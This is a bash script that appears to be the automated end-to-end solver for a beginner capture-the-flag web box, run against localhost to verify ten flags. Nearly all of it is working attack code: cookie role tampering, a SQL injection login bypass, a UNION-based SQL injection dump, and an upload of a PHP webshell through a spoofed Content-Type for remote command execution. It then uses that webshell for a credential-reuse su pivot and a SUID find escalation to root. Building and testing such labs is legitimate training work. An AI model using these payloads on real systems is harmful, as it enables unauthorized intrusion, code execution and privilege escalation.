#!/bin/bash
# Automated end-to-end solver, used only to prove the box is solvable
# before publishing it. Requires: curl, steghide, python3.
set -euo pipefail
cd "$(dirname "$0")/.."

HOST=localhost
PORT=8002
BASE="http://$HOST:$PORT"

source .env
export CTF_SECRET

check() {
    local n="$1" got="$2"
    local want
    want=$(python3 -c "
import os, hmac, hashlib
secret = os.environ['CTF_SECRET']
d = hmac.new(secret.encode(), f'beginner-reading-room:$n'.encode(), hashlib.sha256).hexdigest()
print(f'HLC{{{d[:10]}}}')")
    if [ "$got" = "$want" ]; then
        echo "flag $n: OK ($got)"
    else
        echo "flag $n: MISMATCH got='$got' want='$want'" >&2
        exit 1
    fi
}

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

# 1
F1=$(curl -s "$BASE/" | grep -oE 'HLC\{[a-f0-9]{10}\}' | head -1)
check 1 "$F1"

# 2
JAR="$WORK/jar.txt"
curl -s -c "$JAR" -d 'username=librarian&password=librarian123' "$BASE/staff/login.php" -o /dev/null
SESSID=$(awk '/PHPSESSID/{print $7}' "$JAR")
F2=$(curl -s -H "Cookie: PHPSESSID=$SESSID; role=staff" "$BASE/staff/dashboard.php" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 2 "$F2"

# 3 (cookie tamper -- same session, role=admin instead)
F3=$(curl -s -H "Cookie: PHPSESSID=$SESSID; role=admin" "$BASE/staff/dashboard.php" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 3 "$F3"

# 4
F4=$(curl -s "$BASE/backup/catalog_backup.sql.txt" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 4 "$F4"

# 5 (SQLi auth bypass)
JAR5="$WORK/jar5.txt"
curl -s -c "$JAR5" -d "username=' OR '1'='1' -- &password=x" "$BASE/staff/login.php" -o /dev/null
SESSID5=$(awk '/PHPSESSID/{print $7}' "$JAR5")
F5=$(curl -s -H "Cookie: PHPSESSID=$SESSID5" "$BASE/staff/panel.php" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 5 "$F5"

# 6 (UNION-based SQLi)
RESP6=$(curl -s -G "$BASE/catalog/search.php" --data-urlencode "q=zzz' UNION SELECT note, passphrase FROM staff_notes -- -")
F6=$(echo "$RESP6" | grep -oE 'HLC\{[a-f0-9]{10}\}')
PASSPHRASE=$(echo "$RESP6" | sed -n 's/.*— \(.*\)<\/li>.*/\1/p')
check 6 "$F6"

# 7 (unrestricted upload via spoofed Content-Type -> webshell RCE)
printf '<?php system($_GET["c"]); ?>' > "$WORK/shell.php"
curl -s -F "cover=@$WORK/shell.php;filename=shell.php;type=image/jpeg" "$BASE/catalog/upload.php" -o /dev/null
F7=$(curl -s -G "$BASE/uploads/shell.php" --data-urlencode "c=cat /opt/flag7.txt")
check 7 "$F7"

# 8 (steganography, passphrase recovered from flag 6's UNION row)
curl -s -o "$WORK/cover.jpg" "$BASE/images/ledgers_of_dust.jpg"
F8=$(steghide extract -sf "$WORK/cover.jpg" -p "$PASSPHRASE" -xf "$WORK/f8.txt" -f >/dev/null && cat "$WORK/f8.txt")
check 8 "$F8"

# 9 (credential-reuse su pivot, via the webshell's RCE)
F9=$(curl -s -G "$BASE/uploads/shell.php" --data-urlencode "c=echo librarian123 | su mcurie -c 'cat /home/mcurie/flag9.txt'")
check 9 "$F9"

# 10 (SUID find -> root, via the webshell's RCE)
F10=$(curl -s -G "$BASE/uploads/shell.php" --data-urlencode 'c=find /root/flag10.txt -exec cat {} \;')
check 10 "$F10"

echo
echo "All 10 flags verified end-to-end."
